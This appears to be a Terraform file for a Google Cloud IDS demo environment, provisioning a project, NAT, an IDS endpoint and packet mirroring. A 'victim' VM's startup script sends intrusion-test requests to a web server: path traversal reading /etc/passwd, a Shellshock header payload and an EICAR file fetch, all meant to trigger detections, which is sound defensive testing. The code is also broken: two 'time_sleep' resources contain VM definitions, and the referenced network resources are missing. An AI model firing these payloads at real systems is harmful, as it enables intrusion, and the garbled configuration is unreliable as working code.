/**
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

## NOTE: This provides PoC demo environment for various use cases ##
##  This is not built for production workload ##

# Create the Cloud IDS Project
resource "google_project" "ids_project" {
  project_id      = "YOUR_PROJECT_ID"
  name            = "SF Sol InfraMod-addon-IDS"
  billing_account = var.billing_account
  folder_id       = var.folder_id
}


# Enable the necessary API services
resource "google_project_service" "ids_api_service" {
  for_each = toset([
    "servicenetworking.googleapis.com",
    "ids.googleapis.com",
    "logging.googleapis.com",
    "compute.googleapis.com",
  ])

  service = each.key

  project                    = google_project.ids_project.project_id
  disable_on_destroy         = true
  disable_dependent_services = true

}



# wait delay after enabling APIs
resource "time_sleep" "wait_120_seconds_enable_service_api_ids" {


  boot_disk {
    initialize_params {
      image = "debian-cloud/debian-10"
    }
  }

  network_interface {
    network    = google_compute_network.ids_network.self_link
    subnetwork = google_compute_subnetwork.ids_subnetwork.self_link
    network_ip = "192.168.10.20"
  }

  service_account {
    # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.
    email  = google_service_account.def_ser_acc.email
    scopes = ["cloud-platform"]
  }
  metadata_startup_script = "apt-get update -y;apt-get install -y nginx;cd /var/www/html/;sudo touch eicar.file"
  labels = {
    asset_type  = "prod"
    osshortname = "linux"
  }
}



resource "time_sleep" "wait_30_seconds_victim_server" {


  boot_disk {
    initialize_params {
      image = "debian-cloud/debian-10"
    }
  }

  network_interface {
    network    = google_compute_network.ids_network.self_link
    subnetwork = google_compute_subnetwork.ids_subnetwork.self_link
    network_ip = "192.168.10.10"
  }

  service_account {
    # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.
    email  = google_service_account.def_ser_acc.email
    scopes = ["cloud-platform"]
  }

  metadata_startup_script = "curl http://192.168.10.20/?item=../../../../WINNT/win.ini;curl http://192.168.10.20/eicar.file;curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd;curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical"
  labels = {
    asset_type  = "prod"
    osshortname = "linux"
  }
}


# Create a CloudRouter
resource "google_compute_router" "ids_router" {
  project = google_project.ids_project.project_id
  name    = "ids-subnet-router"
  region  = google_compute_subnetwork.ids_subnetwork.region
  network = google_compute_network.ids_network.id

  bgp {
    asn = 64514
  }
}


# Configure a CloudNAT
resource "google_compute_router_nat" "ids_nats" {
  project                            = google_project.ids_project.project_id
  name                               = "nat-cloud-ids-${var.vpc_network_name}"
  router                             = google_compute_router.ids_router.name
  region                             = google_compute_router.ids_router.region
  nat_ip_allocate_option             = "AUTO_ONLY"
  source_subnetwork_ip_ranges_to_nat = "ALL_SUBNETWORKS_ALL_IP_RANGES"

  log_config {
    enable = true
    filter = "ERRORS_ONLY"
  }
  depends_on = [google_compute_router.ids_router]
}
# Modernized: Native google_ids_endpoint replaces null_resource
resource "google_ids_endpoint" "ids_endpoint" {
  name     = "cloud-ids-${var.vpc_network_name}"
  location = var.network_zone
  network  = google_compute_network.ids_network.id
  severity = "INFORMATIONAL"
  project  = "YOUR_PROJECT_ID"
}

# Modernized: Native packet mirroring replaces null_resource local-exec
resource "google_compute_packet_mirroring" "packet_mirrors" {
  name    = "cloud-ids-packet-mirroring"
  region  = var.network_region
  project = "YOUR_PROJECT_ID"

  network {
    url = google_compute_network.ids_network.id
  }

  collector_ilb {
    url = google_ids_endpoint.ids_endpoint.endpoint_forwarding_rule
  }

  mirrored_resources {
    subnetworks {
      url = google_compute_subnetwork.ids_subnetwork.id
    }
  }
}
